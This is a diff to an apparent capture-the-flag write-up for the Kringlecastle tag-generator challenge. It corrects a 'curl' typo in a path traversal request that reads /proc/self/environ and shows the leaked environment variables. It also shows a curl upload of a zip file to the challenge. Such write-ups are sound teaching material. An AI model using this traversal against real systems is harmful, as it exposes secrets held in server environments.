@@ -19,7 +19,7 @@ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 ```
 Using this the value the environment variable can be obtained like this:
 ```
-url https://tag-generator.kringlecastle.com/image?id=../../../../../proc/self/environ --output -
+curl https://tag-generator.kringlecastle.com/image?id=../../../../../proc/self/environ --output -
 PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
 ```
 So the `GREETZ` variable contains **JackFrostWasHere**
@@ -67,8 +67,8 @@ Get it started:
 curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjEwNzUyOTg0Niw5MjIxNDQzNSwtMzk4ND
-kxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3ODcs
-LTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLDkyMD
-Q1NTg2NSwtMTYwNjA3ODA0MF19
+eyJoaXN0b3J5IjpbLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMj
+E0NDM1LC0zOTg0OTE0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNzIs
+MTkzMzM2MTc4NywtMTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMT
+IwNTY0NTMsOTIwNDU1ODY1LC0xNjA2MDc4MDQwXX0=
 -->
